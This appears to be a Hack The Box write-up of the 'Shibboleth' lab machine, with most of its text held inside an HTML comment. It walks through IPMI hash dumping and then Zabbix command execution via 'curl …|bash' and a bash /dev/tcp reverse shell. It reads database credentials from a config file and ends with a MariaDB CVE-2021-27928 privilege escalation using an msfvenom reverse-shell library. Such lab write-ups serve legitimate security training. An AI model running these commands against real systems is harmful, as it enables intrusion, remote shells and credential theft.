---

title: "Shibboleth"
date: 2022-04-23 01:09:33 +0300
author: oste
# image: /assets/img/Posts/shibboleth.png
categories: [HTB, HTB-Medium]
tags: [metasploit, ThinVNC, CVE-2019-17662, THINVNC 1.0B1 PATH TRAVERSAL]
---

# Coming soon

| <!--            | MACHINE                                                                                                                        | [Shibboleth](https://app.hackthebox.com/machines/410) |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| MACHINE CREATOR | [knightmare](https://www.hackthebox.com/home/users/profile/8930) & [mrb3n](https://www.hackthebox.com/home/users/profile/2984) |
| DIFFICULTY      | Medium                                                                                                                         |
| MACHINE IP      | 10.10.11.124                                                                                                                   |

We first begin by performing an nmap scan to determine what ports are open and what services are running behind them.

```bash
➜  Shibboleth nmap -sC -sV -p- -T4 10.10.11.124
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-11 16:10 EDT
Nmap scan report for 10.10.11.124
Host is up (0.23s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 940.49 seconds
```

In this case, we only have one port running, 80 , which seems to redirect to `http://shibboleth.htb/`. So we need to add the hostname to the hosts file. After doing so, we can proceed to inspect the site.

//image missing

![image](https://user-images.githubusercontent.com/58165365/162826426-f074e857-d775-43e7-b020-28d97533ce33.png)

![image](https://user-images.githubusercontent.com/58165365/162826525-d9432e7b-f27d-4fac-ba8e-c70084860485.png)

![image](https://user-images.githubusercontent.com/58165365/162828145-1f3b7ae7-39d3-4f16-8d6f-916dfd592ecb.png)

![image](https://user-images.githubusercontent.com/58165365/162825865-9a50cf75-3013-4cc9-a424-85fb8bb24ff7.png)

```bash
➜  Shibboleth wfuzz -u http://shibboleth.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.shibboleth.htb" --hw 26 --hl 9

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000099:   200        29 L     219 W      3687 Ch     "monitor"
000000346:   200        29 L     219 W      3687 Ch     "monitoring"
000000390:   200        29 L     219 W      3687 Ch     "zabbix"
```

![image](https://user-images.githubusercontent.com/58165365/162828932-8c9ca7be-395e-46d2-a545-1ababf236b53.png)

![image](https://user-images.githubusercontent.com/58165365/162829094-80bbe4b3-b2ea-46b1-b9b9-7dce86d47b83.png)

![image](https://user-images.githubusercontent.com/58165365/162829193-7e27ea6c-8284-48fb-a5b4-f206834fc5e0.png)

```bash
msf6 > search ipmi

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank    Check  Description
   -  ----                                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ipmi/ipmi_cipher_zero                 2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
   1  auxiliary/scanner/ipmi/ipmi_dumphashes                  2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
   2  auxiliary/scanner/ipmi/ipmi_version                                      normal  No     IPMI Information Discovery
   3  exploit/multi/upnp/libupnp_ssdp_overflow                2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
   4  auxiliary/scanner/http/smt_ipmi_cgi_scanner             2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
   5  auxiliary/scanner/http/smt_ipmi_49152_exposure          2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
   6  auxiliary/scanner/http/smt_ipmi_static_cert_scanner     2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
   7  exploit/linux/http/smt_ipmi_close_window_bof            2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
   8  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal  2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal


Interact with a module by name or index. For example info 8, use 8 or use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal

msf6 > use 2
msf6 auxiliary(scanner/ipmi/ipmi_version) > options

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads

msf6 auxiliary(scanner/ipmi/ipmi_version) > setg RHOSTS shibboleth.htb
RHOSTS => shibboleth.htb
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

```bash
msf6 > use 1
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                shibboleth.htb                                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:b5b40a7082090000a49188fc8d3a51f3e73bab9854a4a34bbfe133a72e35d643946d9cbba1fbe1a3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:ddc315e4a5b763cc628d35359594696e325594d1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

![image](https://user-images.githubusercontent.com/58165365/162931660-331f4984-6e61-4726-bac6-052ce9af0cb8.png)

# Login to dashboard

![image](https://user-images.githubusercontent.com/58165365/164891099-5a3fc611-5dbf-4219-9369-64d153048c0e.png)

![image](https://user-images.githubusercontent.com/58165365/164891140-4e175f8c-ec90-4325-941e-0b29c40d4158.png)

![image](https://user-images.githubusercontent.com/58165365/164891282-16d8196f-ebc4-4308-8c23-92a33b127989.png)

![image](https://user-images.githubusercontent.com/58165365/164891457-4cbdfc93-a682-4375-a1e1-c9c31d7415f7.png)

![image](https://user-images.githubusercontent.com/58165365/164891487-3dd870cd-d795-45d1-92dc-65708af1cc2a.png)

![image](https://user-images.githubusercontent.com/58165365/164891934-f105fe9b-6d4d-4fce-9d9a-2ea006f84d72.png)

![image](https://user-images.githubusercontent.com/58165365/164891942-14c2b76c-1a74-4fb3-860a-771878edb412.png)

![image](https://user-images.githubusercontent.com/58165365/164891956-7a8ba144-c9db-47e2-8245-adab473985aa.png)

```bash
➜  Shibboleth nc -lnvp 9999
listening on [any] 9999 ...
```

![image](https://user-images.githubusercontent.com/58165365/164892189-e7d70961-6b95-4095-859d-5ca62e222abb.png)

![image](https://user-images.githubusercontent.com/58165365/164892487-4724eb96-c756-4566-b6a6-6159288ddb3c.png)

![image](https://user-images.githubusercontent.com/58165365/164892527-0604959c-e411-4806-aff8-87239d5f9aa7.png)

---

![image](https://user-images.githubusercontent.com/58165365/164910472-9689cccd-7d86-4db9-9d43-ef68e250154c.png)

![image](https://user-images.githubusercontent.com/58165365/164910519-43edfe56-4d12-42d4-a53a-8c219dea49b0.png)

![image](https://user-images.githubusercontent.com/58165365/164913241-16d4b89a-a4c1-4552-9df3-40b6d6e37bc9.png)

`system.run[curl 10.10.16.133,nowait]`
![image](https://user-images.githubusercontent.com/58165365/164910329-1db3d8cc-ced1-4e52-a62d-9c9ded99c544.png)

```bash
➜  Shibboleth serve
Serving files from /home/kali/Desktop/Shibboleth
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![image](https://user-images.githubusercontent.com/58165365/164910401-8c3a5ac3-96d8-492c-a3b0-7931c153f769.png)

```bash
➜  Shibboleth serve
Serving files from /home/kali/Desktop/Shibboleth
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.124 - - [23/Apr/2022 07:38:20] "GET / HTTP/1.1" 200 -
```

`system.run[curl 10.10.16.133|bash,nowait]`

Start a python server and serve index.html

```bash
➜  Shibboleth echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.16.133/8888 0>&1"' > index.html
```

```bash
➜  Shibboleth nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.10.16.133] from (UNKNOWN) [10.10.11.124] 33716
bash: cannot set terminal process group (903): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$ id
id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
zabbix@shibboleth:/$ cat /etc/passwd | grep home
cat /etc/passwd | grep home
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
zabbix@shibboleth:/$ su ipmi-svc
su ipmi-svc
Password: ilovepumkinpie1
id
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
bash -i
bash: cannot set terminal process group (903): Inappropriate ioctl for device
bash: no job control in this shell
ipmi-svc@shibboleth:/$ pwd
pwd
/
ipmi-svc@shibboleth:/$ cd ~
cd ~
ipmi-svc@shibboleth:~$ ls -la
ls -la
total 36
drwxr-xr-x 4 ipmi-svc ipmi-svc 4096 Apr 22 16:15 .
drwxr-xr-x 3 root     root     4096 Oct 16  2021 ..
lrwxrwxrwx 1 ipmi-svc ipmi-svc    9 Apr 27  2021 .bash_history -> /dev/null
-rw-r--r-- 1 ipmi-svc ipmi-svc  220 Apr 24  2021 .bash_logout
-rw-r--r-- 1 ipmi-svc ipmi-svc 3771 Apr 24  2021 .bashrc
drwx------ 2 ipmi-svc ipmi-svc 4096 Apr 27  2021 .cache
drwx------ 3 ipmi-svc ipmi-svc 4096 Apr 22 16:15 .gnupg
lrwxrwxrwx 1 ipmi-svc ipmi-svc    9 Apr 28  2021 .mysql_history -> /dev/null
-rw-r--r-- 1 ipmi-svc ipmi-svc  807 Apr 24  2021 .profile
-rw-r----- 1 ipmi-svc ipmi-svc   33 Apr 22 05:29 user.txt
-rw-rw-r-- 1 ipmi-svc ipmi-svc   22 Apr 24  2021 .vimrc
ipmi-svc@shibboleth:~$ wc user.txt
wc user.txt
 1  1 33 user.txt
```

Zabbix server uses either of the following DB engines:

- IBM DB2
- MySQL
- Oracle
- PostgreSQL
- SQLite

Viewing listening ports, we find:

```bash
ipmi-svc@shibboleth:~$ netstat -antp
netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:10050           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:10051           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -

//redacted
```

Zabbix server communicates with the Zabbix agents on ports 10050 and 10051. But we have 3306, meaning it's using mysql. We need credentials though to access the DB. Doing some [research](https://www.zabbix.com/documentation/current/en/manual/installation/install#:~:text=6-,Review%20and%20edit%20configuration%20files,-edit%20the%20Zabbix), we learn that database name, user and password are located in `zabbix_server.conf` file. In this case, we can get that in `/etc/zabbix`.

```bash
ipmi-svc@shibboleth:/var/www/html$ cd /etc/zabbix
cd /etc/zabbix
ipmi-svc@shibboleth:/etc/zabbix$ ls -la
ls -la
total 100
drwxr-xr-x  4 root     root      4096 Nov  8 11:02 .
drwxr-xr-x 96 root     root      4096 Nov  8 11:02 ..
-r--------  1 zabbix   zabbix      33 Apr 24  2021 peeesskay.psk
drwxr-xr-x  2 www-data root      4096 Apr 27  2021 web
-rw-r--r--  1 root     root     15317 May 25  2021 zabbix_agentd.conf
-rw-r--r--  1 root     root     15574 Oct 18  2021 zabbix_agentd.conf.dpkg-dist
drwxr-xr-x  2 root     root      4096 Apr 27  2021 zabbix_agentd.d
-rw-r-----  1 root     ipmi-svc 21863 Apr 24  2021 zabbix_server.conf
-rw-r-----  1 root     ipmi-svc 22306 Oct 18  2021 zabbix_server.conf.dpkg-dist
```

Catting the contents, we get the required credentials.

```bash
ipmi-svc@shibboleth:/etc/zabbix$ cat zabbix_server.conf | grep DB
cat zabbix_server.conf | grep DB
### Option: DBHost
# DBHost=localhost
### Option: DBName
# DBName=
DBName=zabbix
### Option: DBSchema
# DBSchema=
### Option: DBUser
# DBUser=
DBUser=zabbix
### Option: DBPassword
DBPassword=bloooarskybluh
//redacted
```

We can then proceed to connect to the DB as shown:

> _You need to stabilize your shell though before you attempt to connect. Otherwise, your shell will appear frozen._

```bash
zabbix@shibboleth:/tmp$ mysql -u zabbix -D zabbix -p
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2019
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [zabbix]>
```

From the banner, we can see MariaDB's server version. Doing some research, we find that the version is vulnerable to CVE-2021-27928, Command execution vulnerability. Affected versions include:

- 10.2 before 10.2.37
- 10.3 before 10.3.28
- 10.4 before 10.4.18
- 10.5 before 10.5.9

![image](https://user-images.githubusercontent.com/58165365/164914574-9e2924e9-4279-45d1-b0d2-cdbcf6570c2c.png)

So i decided to test the first exploit on the search by [Al1ex/CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928)

You first need to create a reverse shell payload using msfvenom:

```bash
➜  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.133 LPORT=9999 -f elf-so -o root.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: root.so
```

Serve the payload and download it to the target machine

```bash
zabbix@shibboleth:/$ cd /tmp/
zabbix@shibboleth:/tmp$ wget http://10.10.16.133/root.so
--2022-04-23 15:27:29--  http://10.10.16.133/root.so
Connecting to 10.10.16.133:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/octet-stream]
Saving to: ‘root.so’

root.so             100%[===================>]     476  --.-KB/s    in 0s

2022-04-23 15:27:30 (85.0 MB/s) - ‘root.so’ saved [476/476]
```

Start a nc listener in your local machine:

```bash
➜  Shibboleth nc -lnvp 9999
listening on [any] 9999 ...

```

Execute the payload in the mysql shell as shown below

```bash
MariaDB [zabbix]> SET GLOBAL wsrep_provider="/tmp/root.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query
MariaDB [zabbix]>
```

And we now have a shell as root. You can easily get the root flag in `/root` directory.

```bash
➜  nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.16.133] from (UNKNOWN) [10.10.11.124] 35846

id
uid=0(root) gid=0(root) groups=0(root)
bash -i
bash: cannot set terminal process group (852): Inappropriate ioctl for device
bash: no job control in this shell
root@shibboleth:/var/lib/mysql# cd /root
root@shibboleth:/root# ls -la
total 36
drwx------  5 root root 4096 Nov  8 12:58 .
drwxr-xr-x 19 root root 4096 Oct 16  2021 ..
lrwxrwxrwx  1 root root    9 Apr 27  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3115 May 25  2021 .bashrc
drwx------  2 root root 4096 May 12  2021 .cache
drwx------  4 root root 4096 Oct 21  2021 .config
lrwxrwxrwx  1 root root    9 Apr 28  2021 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   22 Apr 24  2021 .vimrc
-r--------  1 root root   33 Apr 22 05:29 root.txt
drwx------  2 root root 4096 Oct 18  2021 scripts
root@shibboleth:/root# wc root.txt
 1  1 33 root.txt
```

https://book.hacktricks.xyz/pentesting/623-udp-ipmi

https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/

file:///tmp/Shibboleth.pdf

https://github.com/c0rnf13ld/ipmiPwner

https://0xdf.gitlab.io/2022/04/02/htb-shibboleth.html -->
